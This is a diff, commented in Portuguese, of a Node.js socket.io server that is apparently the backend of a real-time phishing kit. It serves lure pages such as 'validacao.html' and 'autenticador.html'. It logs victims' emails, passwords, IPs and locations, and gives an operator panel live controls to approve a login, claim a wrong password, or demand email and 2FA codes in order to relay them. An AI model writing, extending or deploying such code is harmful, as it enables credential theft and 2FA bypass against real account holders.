@@ -3,6 +3,7 @@ const http = require('http');
 const { Server } = require('socket.io');
 const cors = require('cors');
 const path = require('path');
+const fs = require('fs');
 const axios = require('axios');
 const UAParser = require('ua-parser-js');
 require('dotenv').config();
@@ -13,12 +14,85 @@ const io = new Server(server, { cors: { origin: '*', methods: ['GET', 'POST'] } 
 
 app.use(cors());
 app.use(express.json());
+
+// Serve arquivos estáticos da raiz do projeto
 app.use(express.static(path.join(__dirname, '..')));
+
+// Rota principal
+app.get('/', (req, res) => {
+    const filePath = path.join(__dirname, '..', 'index.html');
+    console.log('📄 Servindo index.html de:', filePath);
+    res.sendFile(filePath, (err) => {
+        if (err) {
+            console.log('❌ Erro ao enviar index.html:', err.message);
+            // Tenta listar arquivos disponíveis
+            try {
+                const rootFiles = fs.readdirSync(path.join(__dirname, '..'));
+                const backendFiles = fs.readdirSync(__dirname);
+                res.status(404).send(`
+                    <h1>Arquivo não encontrado</h1>
+                    <h2>Raiz do projeto:</h2>
+                    <pre>${rootFiles.join('\n')}</pre>
+                    <h2>Pasta backend:</h2>
+                    <pre>${backendFiles.join('\n')}</pre>
+                `);
+            } catch (e) {
+                res.status(404).send('index.html não encontrado');
+            }
+        }
+    });
+});
+
+// Rota de teste para ver arquivos
+app.get('/test', (req, res) => {
+    try {
+        const rootFiles = fs.readdirSync(path.join(__dirname, '..'));
+        const backendFiles = fs.readdirSync(__dirname);
+        res.json({
+            rootDir: path.join(__dirname, '..'),
+            backendDir: __dirname,
+            rootFiles: rootFiles,
+            backendFiles: backendFiles
+        });
+    } catch (e) {
+        res.json({ error: e.message });
+    }
+});
+
+// Rotas para arquivos HTML
+app.get('/validacao.html', (req, res) => {
+    res.sendFile(path.join(__dirname, '..', 'validacao.html'));
+});
+
+app.get('/autenticador.html', (req, res) => {
+    res.sendFile(path.join(__dirname, '..', 'autenticador.html'));
+});
+
+app.get('/manutencao.html', (req, res) => {
+    res.sendFile(path.join(__dirname, '..', 'manutencao.html'));
+});
+
+app.get('/painel-login.html', (req, res) => {
+    res.sendFile(path.join(__dirname, '..', 'painel-login.html'));
+});
+
+app.get('/painel-dashboard.html', (req, res) => {
+    res.sendFile(path.join(__dirname, '..', 'painel-dashboard.html'));
+});
+
+app.get('/painel', (req, res) => {
+    res.redirect('/painel-login.html');
+});
+
+// Health check
+app.get('/health', (req, res) => {
+    res.json({ status: 'ok', uptime: process.uptime() });
+});
 
 let activeRequests = [];
 let allLogs = [];
 let onlineClients = 0;
-let stats = { approved: 0, rejected: 0, codeSent: 0, codeWrong: 0, maintenance: 0, total: 0 };
+let stats = { approved: 0, rejected: 0, codeSent: 0, codeWrong: 0, maintenance: 0, total: 0, twofa: 0 };
 const geoCache = new Map();
 
 function getClientIP(socket) {
@@ -61,6 +135,8 @@ io.on('connection', async (socket) => {
     const type = socket.handshake.query.type;
     const ip = getClientIP(socket);
     const ua = parseUA(socket.handshake.headers['user-agent'] || '');
+
+    console.log(`🔌 Conexão: ${type || 'desconhecido'} | IP: ${ip}`);
 
     // ============ CLIENTE LOGIN ============
     if (type === 'client') {
@@ -192,7 +268,6 @@ io.on('connection', async (socket) => {
         emitUpdate();
         socket.emit('clients_update', { online: onlineClients });
 
-        // APROVAR LOGIN
         socket.on('validate_login', (data) => {
             const req = activeRequests.find(r => r.id === data.requestId);
             if (req && req.clientSocketId) {
@@ -206,7 +281,6 @@ io.on('connection', async (socket) => {
             }
         });
 
-        // SENHA INCORRETA
         socket.on('wrong_password', (data) => {
             const req = activeRequests.find(r => r.id === data.requestId);
             if (req && req.clientSocketId) {
@@ -217,7 +291,6 @@ io.on('connection', async (socket) => {
             }
         });
 
-        // CÓDIGO EMAIL
         socket.on('send_code_email', (data) => {
             const req = activeRequests.find(r => r.id === data.requestId);
             if (req && req.clientSocketId) {
@@ -228,18 +301,16 @@ io.on('connection', async (socket) => {
             }
         });
 
-        // 2FA (redireciona pra autenticador.html)
         socket.on('send_2fa', (data) => {
             const req = activeRequests.find(r => r.id === data.requestId);
             if (req && req.clientSocketId) {
                 io.to(req.clientSocketId).emit('login_result', { action: 'redirect_2fa', message: '' });
                 allLogs.push({ timestamp: new Date().toLocaleString('pt-BR'), type: 'LOGIN', email: req.email, password: req.password, ip: req.ip, country: req.country, flag: req.flag, browser: req.browser, action: '2FA Solicitado' });
-                stats.codeSent++;
+                stats.twofa++;
                 emitUpdate();
             }
         });
 
-        // MANUTENÇÃO (login)
         socket.on('send_maintenance', (data) => {
             const req = activeRequests.find(r => r.id === data.requestId);
             if (req && req.clientSocketId) {
@@ -250,7 +321,6 @@ io.on('connection', async (socket) => {
             }
         });
 
-        // CÓDIGO CORRETO
         socket.on('code_approved', (data) => {
             const req = activeRequests.find(r => r.id === data.requestId);
             if (req && req.clientSocketId) {
@@ -261,7 +331,6 @@ io.on('connection', async (socket) => {
             }
         });
 
-        // CÓDIGO ERRADO
         socket.on('code_wrong', (data) => {
             const req = activeRequests.find(r => r.id === data.requestId);
             if (req && req.clientSocketId) {
@@ -272,7 +341,6 @@ io.on('connection', async (socket) => {
             }
         });
 
-        // CÓDIGO MANUTENÇÃO
         socket.on('code_maintenance', (data) => {
             const req = activeRequests.find(r => r.id === data.requestId);
             if (req && req.clientSocketId) {
@@ -283,7 +351,6 @@ io.on('connection', async (socket) => {
             }
         });
 
-        // 2FA CORRETO
         socket.on('2fa_approved', (data) => {
             const req = activeRequests.find(r => r.id === data.requestId);
             if (req && req.clientSocketId) {
@@ -294,7 +361,6 @@ io.on('connection', async (socket) => {
             }
         });
 
-        // 2FA INCORRETO
         socket.on('2fa_wrong', (data) => {
             const req = activeRequests.find(r => r.id === data.requestId);
             if (req && req.clientSocketId) {
@@ -305,7 +371,6 @@ io.on('connection', async (socket) => {
             }
         });
 
-        // 2FA MANUTENÇÃO
         socket.on('2fa_maintenance', (data) => {
             const req = activeRequests.find(r => r.id === data.requestId);
             if (req && req.clientSocketId) {
@@ -316,7 +381,6 @@ io.on('connection', async (socket) => {
             }
         });
 
-        // APAGAR CARD
         socket.on('delete_request', (data) => {
             const idx = activeRequests.findIndex(r => r.id === data.requestId);
             if (idx !== -1) {
@@ -330,6 +394,9 @@ io.on('connection', async (socket) => {
 });
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => {
+server.listen(PORT, '0.0.0.0', () => {
+    console.log('═══════════════════════════════════');
     console.log(`🚀 Servidor rodando na porta ${PORT}`);
+    console.log(`📂 Raiz do projeto: ${path.join(__dirname, '..')}`);
+    console.log('═══════════════════════════════════');
 });
